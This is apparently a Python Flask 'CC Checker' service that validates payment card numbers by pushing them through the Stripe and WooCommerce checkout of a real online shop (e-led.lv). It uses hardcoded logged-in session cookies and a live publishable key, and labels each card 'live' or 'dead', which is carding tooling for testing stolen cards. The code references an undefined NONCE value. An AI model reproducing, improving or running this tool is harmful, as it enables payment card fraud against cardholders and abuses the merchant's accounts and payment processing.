from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# TERE ORIGINAL COOKIES
COOKIES = {
    'wordpress_sec_417153a0f5c2f87ed25ef38d98bb3798': 'uslfjae2q%7C1762849683%7CQMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo%7Cfcc7f214dd3ce843e5685de367f552785729f3c31f8f81dfd09734e768a60625',
    '_ga': 'GA1.1.1745993156.1761639993',
    '__stripe_mid': '588bccab-9133-4397-b3e2-f2785fdd613ca53fc1',
    'woodmart_cookies_1': 'accepted',
    'wordpress_logged_in_417153a0f5c2f87ed25ef38d98bb3798': 'uslfjae2q%7C1762849683%7CQMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo%7Cc6e9da7a0844dce9aa65df1edba937f150e7838393e5dd6d652310ab93dc7316',
    'wp-wpml_current_language': 'en',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-29%2000%3A34%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-29%2000%3A34%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2015%3B%20V2312%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Mobile%20Safari%2F537.36',
    '__stripe_sid': 'a5043f11-4679-4b52-962c-8747f54af89016e011',
    '_ga_1VF3WFHL9K': 'GS2.1.s1761699892$o2$g1$t1761700106$j53$l0$h0',
    'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F'
}

def luhn_valid(card):
    digits = [int(d) for d in card if d.isdigit()]
    total = sum(d if i % 2 == 0 else (d * 2 if d * 2 < 10 else d * 2 - 9) for i, d in enumerate(digits[::-1]))
    return total % 10 == 0

def get_bin(cc):
    try:
        r = requests.get(f"https://lookup.binlist.net/{cc[:6]}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                "brand": d.get("brand", "Unknown"),
                "bank": d.get("bank", {}).get("name", "Unknown"),
                "country": d.get("country", {}).get("name", "Unknown")
            }
    except:
        pass
    return {"brand": "Unknown", "bank": "Unknown", "country": "Unknown"}

@app.route('/')
def home():
    return jsonify({"msg": "E-LED CC Checker Live! Use /cc=number|mm|yy|cvc"})

@app.route('/cc=<path:cc_data>')
def check_cc(cc_data):
    parts = cc_data.split('|')
    if len(parts) != 4:
        return jsonify({"status": "error", "msg": "Use: number|mm|yy|cvc"}), 400

    cc, mm, yy, cvc = parts
    if not luhn_valid(cc):
        return jsonify({"status": "dead", "msg": "Luhn Failed", "cc": cc}), 200

    bin_info = get_bin(cc)

    # FIXED – MULTI-LINE STRING WITH .format()
    data_stripe = """type=card&card[number]={} &card[cvc]={} &card[exp_year]={} &card[exp_month]={} &allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2F2ee772a1e3%3B+stripe-js-v3%2F2ee772a1e3%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=96327&client_attribution_metadata[client_session_id]=5947447b-74ec-42d1-aa64-f880939047c1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=fe357b77-6fc9-43f8-82f8-1d04cb6dd2ca&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=5f4b7095-9d5d-4032-bc0c-511afd16336d4ec3ab&muid=588bccab-9133-4397-b3e2-f2785fdd613ca53fc1&sid=a5043f11-4679-4b52-962c-8747f54af89016e011&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20""".format(cc, cvc, yy, mm)

    # Stripe Headers
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }

    # Step 1: Stripe PM Create
    try:
        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, cookies=COOKIES, timeout=10)
        if stripe_response.status_code == 200:
            stripe_data = stripe_response.json()
            pm_id = stripe_data.get('id', '')
            if not pm_id:
                return jsonify({"status": "dead", "msg": "PM ID not found", "cc": cc}), 400
        else:
            return jsonify({"status": "dead", "msg": "Stripe Error", "cc": cc}), 400
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

    # Step 2: AJAX Confirm
    headers_ajax = {
        'authority': 'e-led.lv',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://e-led.lv',
        'referer': 'https://e-led.lv/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data_ajax = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': NONCE,
    }

    try:
        ajax_response = requests.post('https://e-led.lv/wp-admin/admin-ajax.php', cookies=COOKIES, headers=headers_ajax, data=data_ajax, timeout=10)
        if ajax_response.status_code == 200:
            ajax_data = ajax_response.json()
            if ajax_data.get('result') == 'success':
                return jsonify({
                    "status": "live",
                    "msg": "Card Live!",
                    "cc": cc,
                    "last4": cc[-4:],
                    "bin_info": get_bin(cc)
                })
            else:
                msg = ajax_data.get('messages', 'Declined').replace('<div class="woocommerce-error">', '').replace('</div>', '').strip()
                return jsonify({
                    "status": "dead",
                    "msg": msg,
                    "cc": cc
                })
        else:
            return jsonify({"status": "dead", "msg": "AJAX Error", "cc": cc}), 400
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

if __name__ == '__main__':
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
